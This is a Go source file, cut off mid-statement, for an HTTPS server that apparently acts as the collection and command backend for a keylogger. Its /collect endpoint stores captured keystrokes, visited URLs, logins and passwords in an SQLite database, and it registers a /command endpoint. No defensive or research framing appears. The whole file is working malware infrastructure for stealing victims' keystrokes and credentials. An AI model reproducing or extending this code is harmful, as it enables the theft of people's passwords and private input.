package main

import (
    "crypto/tls"
    "database/sql"
    "fmt"
    "log"
    "net/http"
    "os"

    _ "github.com/mattn/go-sqlite3"
)

var db *sql.DB

func main() {
    var err error

    // Initialize database
    db, err = sql.Open("sqlite3", "./keystrokes.db")
    if err != nil {
        log.Fatal(err)
    }
    defer db.Close()

    // Create tables if not exists
    sqlStmt := `
    CREATE TABLE IF NOT EXISTS keystrokes (
        id INTEGER PRIMARY KEY AUTOINCREMENT, 
        data TEXT
    );
    CREATE TABLE IF NOT EXISTS urls (
        id INTEGER PRIMARY KEY AUTOINCREMENT, 
        url TEXT
    );
    CREATE TABLE IF NOT EXISTS logins (
        id INTEGER PRIMARY KEY AUTOINCREMENT, 
        login TEXT
    );
    CREATE TABLE IF NOT EXISTS passwords (
        id INTEGER PRIMARY KEY AUTOINCREMENT, 
        password TEXT
    );`
    _, err = db.Exec(sqlStmt)
    if err != nil {
        log.Fatalf("%q: %s\n", err, sqlStmt)
    }

    // Read server address from environment variable or use default
    serverAddr := os.Getenv("SERVER_ADDR")
    if serverAddr == "" {
        serverAddr = ":443"
    }

    // Set up HTTPS server
    mux := http.NewServeMux()
    mux.HandleFunc("/collect", collectHandler)
    mux.HandleFunc("/command", commandHandler)

    server := &http.Server{
        Addr:    serverAddr,
        Handler: mux,
        TLSConfig: &tls.Config{
            MinVersion: tls.VersionTLS12,
        },
    }

    log.Printf("Starting server on %s\n", serverAddr)
    err = server.ListenAndServeTLS("cert.pem", "key.pem")
    if err != nil {
        log.Fatal(err)
    }
}

func collectHandler(w http.ResponseWriter, r *http.Request) {
    if r.Method != http.MethodPost {
        http.Error(w, "Invalid request method", http.StatusMethodNotAllowed)
        return
    }

    r.ParseForm()
    keys := r.FormValue("keys")
    urls := r.FormValue("urls")
    logins := r.FormValue("logins")
    passwords := r.FormValue("passwords")

    if keys != "" {
        _, err := db.Exec("INSERT INTO keystrokes (data) VALUES (?)", keys)
        if err != nil {
            http.Error(w, "Failed to store keystrokes", http.StatusInternalServerError)
            return
        }
    }

    if urls != "" {
        _, err := db.Exec("INSERT INTO urls (url) VALUES (?)", urls)
        if err != nil {
            http.Error(w, "Failed to store URLs", http.StatusInternalServerError)
            return
        }
    }

    if logins != "" {
        _, err := db.Exec("INSERT INTO logins (login) VALUES (?)", logins)
        if err != nil {
            http.Error(w, "Failed to store logins", http.StatusInternalServerError)
            return
        }
    }

    if passwords != "" {
        _, err